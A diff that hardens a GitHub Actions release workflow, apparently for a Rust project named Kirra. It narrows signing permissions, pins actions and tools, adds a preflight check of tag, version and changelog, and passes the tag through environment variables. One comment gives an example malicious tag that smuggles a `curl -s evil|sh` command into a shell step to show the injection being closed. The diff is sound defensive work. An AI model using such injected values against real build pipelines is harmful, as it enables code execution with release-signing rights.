@@ -23,28 +23,97 @@ on:
     tags:
       - 'v*'
 
+# #775 F1 — least-privilege by default. The workflow-level grant is READ ONLY;
+# the OIDC signing identity (`id-token: write`) and release-write scope are
+# granted PER-JOB, to the `release` job only. Previously these were workflow-wide,
+# so every job — including `build-dashboard` (npm) and `build` (build scripts,
+# `cross`) — could mint the release-signing OIDC token from any `run` step and
+# `cosign sign-blob` arbitrary blobs under the release identity. Now only the job
+# that actually signs holds the token.
 permissions:
-  contents: write  # Required to create GitHub releases
-  id-token: write  # WS-0.6: keyless cosign signing (GitHub OIDC identity)
+  contents: read
 
 jobs:
-  build-dashboard:
-    name: Build dashboard
+  # #776 F1 + F4 — PREFLIGHT: fail fast BEFORE any build/SBOM/signing runs.
+  # Previously the tag↔manifest version consistency was policy-only (a `v9.9.9`
+  # tag on a 1.1.2 tree released self-contradictory SIGNED artifacts), and the
+  # changelog gate fired LAST — after three cross-compiles, the SBOM, AND cosign
+  # had already written signatures to the public Rekor log for a release that
+  # then aborted. This job checks both in seconds with no toolchain and no build,
+  # so a bad tag never reaches the signing identity.
+  preflight:
+    name: Preflight (tag ↔ version, changelog)
     runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    env:
+      # #775 F5 — route the tag through env so it reaches the shell as DATA, not
+      # interpolated into the script text. Refnames forbid `\` and `[` but ALLOW
+      # `$ ( ) ; ' " ` &`, so a tag like `v1";curl -s evil|sh;"` interpolated into
+      # a `run:` block would execute; as `"$VERSION"` it cannot.
+      VERSION: ${{ github.ref_name }}
     steps:
       - name: Checkout
-        uses: actions/checkout@v7
+        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7
+
+      - name: Tag must equal the root Cargo.toml version (#776 F1)
+        run: |
+          MANIFEST_V=$(awk -F'"' '/^\[package\]/{p=1} p&&/^version[[:space:]]*=/{print $2; exit}' Cargo.toml)
+          if [ -z "$MANIFEST_V" ]; then
+            echo "::error::could not parse the [package] version from Cargo.toml"
+            exit 1
+          fi
+          if [ "v${MANIFEST_V}" != "$VERSION" ]; then
+            echo "::error::tag $VERSION does not match the root Cargo.toml version v${MANIFEST_V} —" \
+                 "the tag MUST equal the manifest version (docs/VERSIONING_POLICY.md). Fix one and re-tag."
+            exit 1
+          fi
+          echo "OK: tag $VERSION == Cargo.toml v${MANIFEST_V}"
+
+      - name: Changelog section must exist for this tag (#776 F4)
+        run: |
+          if [ ! -f CHANGELOG.md ]; then
+            echo "::error::CHANGELOG.md is missing — a release must ship real notes (WS-0.7)."
+            exit 1
+          fi
+          # Same exact-prefix bracketed-heading match as the release job's
+          # extractor (the version is compared as a STRING, never a regex).
+          awk -v ver="$VERSION" '
+            /^## / { want = "## [" ver "]"; flag = (substr($0, 1, length(want)) == want); next }
+            flag' CHANGELOG.md > /tmp/notes_check.md
+          if [ ! -s /tmp/notes_check.md ]; then
+            echo "::error file=CHANGELOG.md::No '## [$VERSION]' section in CHANGELOG.md — a release must" \
+                 "ship real notes (WS-0.7). Add the section (rename [Unreleased]), then cut the NEXT patch" \
+                 "version and tag that. Do NOT delete/re-push a tag: keyless signing would leave conflicting" \
+                 "Rekor entries for one identity."
+            exit 1
+          fi
+          echo "OK: CHANGELOG.md has a '## [$VERSION]' section"
+
+  build-dashboard:
+    name: Build dashboard
+    needs: preflight
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - name: Checkout
+        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7
 
       - name: Set up Node.js
-        uses: actions/setup-node@v6
+        uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6
         with:
           node-version: '20'
 
       - name: Build dashboard
-        run: cd dashboard && npm install && npm run build
+        # #775 F1 — `npm ci` (not `npm install`): install exactly the committed
+        # package-lock.json, deterministically, instead of re-resolving at build
+        # time. (Postinstall scripts still run, but this job no longer holds the
+        # OIDC signing token — see the per-job permissions above.)
+        run: cd dashboard && npm ci && npm run build
 
       - name: Upload dashboard artifact
-        uses: actions/upload-artifact@v7
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7
         with:
           name: kirra-dashboard-dist
           path: dashboard/dist/
@@ -52,8 +121,12 @@ jobs:
 
   build:
     name: Build ${{ matrix.target_name }}
-    needs: build-dashboard
+    needs: [preflight, build-dashboard]
     runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    env:
+      VERSION: ${{ github.ref_name }}  # #775 F5 — tag as data, not interpolated script
     strategy:
       matrix:
         include:
@@ -71,16 +144,21 @@ jobs:
 
     steps:
       - name: Checkout
-        uses: actions/checkout@v7
+        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7
 
       - name: Install Rust toolchain
-        uses: dtolnay/rust-toolchain@stable
+        uses: dtolnay/rust-toolchain@4be7066ada62dd38de10e7b70166bc74ed198c30 # stable
         with:
           targets: ${{ matrix.target }}
 
       - name: Install cross (for ARM targets)
         if: matrix.cross
-        run: cargo install cross --git https://github.com/cross-rs/cross
+        # #775 F1 — install `cross` from the crates.io REGISTRY at a pinned
+        # version + `--locked` (was: unpinned `--git` HEAD — whatever upstream
+        # main was at run time, with its build scripts executing in the release
+        # pipeline). Registry install is checksummed and covered by the cargo-deny
+        # supply-chain gate; it keeps no git/tag-resolution dependency in the build.
+        run: cargo install cross --version 0.2.5 --locked
 
       - name: Build kirra_verifier_service
         run: |
@@ -101,14 +179,15 @@ jobs:
           fi
 
       - name: Download dashboard
-        uses: actions/download-artifact@v8
+        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8
         with:
           name: kirra-dashboard-dist
           path: dashboard-dist/
 
       - name: Package release
         run: |
-          VERSION="${{ github.ref_name }}"
+          # $VERSION from job env (#775 F5). Matrix values are workflow-defined
+          # (not attacker-controllable), so interpolating them is safe.
           TARGET_NAME="${{ matrix.target_name }}"
           TARGET="${{ matrix.target }}"
           ARCHIVE_NAME="kirra-${VERSION}-${TARGET_NAME}.tar.gz"
@@ -138,7 +217,7 @@ jobs:
           echo "ARCHIVE_NAME=${ARCHIVE_NAME}" >> "${GITHUB_ENV}"
 
       - name: Upload artifact
-        uses: actions/upload-artifact@v7
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7
         with:
           name: kirra-${{ matrix.target_name }}
           path: kirra-*.tar.gz
@@ -150,20 +229,27 @@ jobs:
   # the version so it travels with the artifacts.
   sbom:
     name: Generate SBOM (CycloneDX)
+    needs: preflight
     runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    env:
+      VERSION: ${{ github.ref_name }}  # #775 F5
     steps:
       - name: Checkout
-        uses: actions/checkout@v7
+        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7
 
       - name: Install Rust toolchain
-        uses: dtolnay/rust-toolchain@stable
+        uses: dtolnay/rust-toolchain@4be7066ada62dd38de10e7b70166bc74ed198c30 # stable
 
       - name: Install cargo-cyclonedx
-        run: cargo install cargo-cyclonedx --locked
+        # #775 F1/F10 — pin the tool version (was: unpinned; an upstream naming
+        # or behaviour change would silently alter the release SBOM).
+        run: cargo install cargo-cyclonedx --version 0.5.9 --locked
 
       - name: Generate SBOM for the release binaries
         run: |
-          VERSION="${{ github.ref_name }}"
+          # $VERSION from job env (#775 F5).
           # `--describe binaries` emits one SBOM per workspace binary; the
           # release ships exactly two (kirra_verifier_service and
           # kirra_carla_client, both from the root crate — their SBOMs land
@@ -182,7 +268,7 @@ jobs:
           ls -l ./*.cdx.json
 
       - name: Upload SBOM artifact
-        uses: actions/upload-artifact@v7
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7
         with:
           name: kirra-sbom
           path: kirra-*.cdx.json
@@ -197,13 +283,18 @@ jobs:
   # evidence is QNX-target-only (PROVENANCE.txt states this).
   qnx-artifact:
     name: QNX governor-judge artifact
+    needs: preflight
     runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    env:
+      VERSION: ${{ github.ref_name }}  # #775 F5
     steps:
       - name: Checkout
-        uses: actions/checkout@v7
+        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7
 
       - name: Install Rust toolchain (+rust-src for -Zbuild-std)
-        uses: dtolnay/rust-toolchain@stable
+        uses: dtolnay/rust-toolchain@4be7066ada62dd38de10e7b70166bc74ed198c30 # stable
         with:
           components: rust-src
 
@@ -212,11 +303,11 @@ jobs:
 
       - name: Package
         run: |
-          VERSION="${{ github.ref_name }}"
+          # $VERSION from job env (#775 F5).
           tar -czf "kirra-${VERSION}-qnx800-judge.tar.gz" -C dist-qnx .
 
       - name: Upload artifact
-        uses: actions/upload-artifact@v7
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7
         with:
           name: kirra-qnx800-judge
           path: kirra-*-qnx800-judge.tar.gz
@@ -226,12 +317,23 @@ jobs:
     name: Create GitHub Release
     needs: [build, sbom, qnx-artifact]
     runs-on: ubuntu-latest
+    # #775 F1 — the ONLY job granted the OIDC signing identity + release-write.
+    # It runs no third-party build scripts (checkout, download, checksum, cosign,
+    # gh-release), so the token is not exposed to untrusted code.
+    permissions:
+      contents: write  # create the GitHub release
+      id-token: write  # keyless cosign signing (GitHub OIDC identity)
+    env:
+      # #775 F5 — the signing job routes the tag through env (data, not
+      # interpolated script), the highest-value place to close the injection
+      # surface since this is the job that holds the OIDC token.
+      VERSION: ${{ github.ref_name }}
     steps:
       - name: Checkout
-        uses: actions/checkout@v7
+        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7
 
       - name: Download all artifacts
-        uses: actions/download-artifact@v8
+        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8
         with:
           path: dist
           merge-multiple: true
@@ -249,7 +351,7 @@ jobs:
       # certificate + Rekor proof) that verifies OFFLINE against the pinned
       # identity — no key management, nothing to leak.
       - name: Install cosign
-        uses: sigstore/cosign-installer@v3
+        uses: sigstore/cosign-installer@398d4b0eeef1380460a10c8013a76f728fb906ac # v3
 
       - name: Sign release artifacts (keyless, GitHub OIDC)
         run: |
@@ -262,11 +364,11 @@ jobs:
       - name: Extract changelog for this version
         id: changelog
         run: |
-          VERSION="${{ github.ref_name }}"
+          # `$VERSION` comes from the job-level env (#775 F5). Preflight already
+          # validated the section exists; this re-extracts it for the release body.
           # WS-0.7: the changelog section is REQUIRED. Extract the section
           # whose heading names the pushed tag; a missing/empty section
-          # FAILS the release — no more "Release vX" fallback notes. Write
-          # the section in CHANGELOG.md (rename [Unreleased]) and re-tag.
+          # FAILS the release — no more "Release vX" fallback notes.
           #
           # Exact-prefix match on the BRACKETED heading ("## [vX.Y.Z]") —
           # the version is compared as a STRING, never interpolated into a
@@ -309,7 +411,7 @@ jobs:
           VERIFY
 
       - name: Create GitHub Release
-        uses: softprops/action-gh-release@v3
+        uses: softprops/action-gh-release@718ea10b132b3b2eba29c1007bb80653f286566b # v3
         with:
           name: Kirra ${{ github.ref_name }}
           body_path: release_notes.md
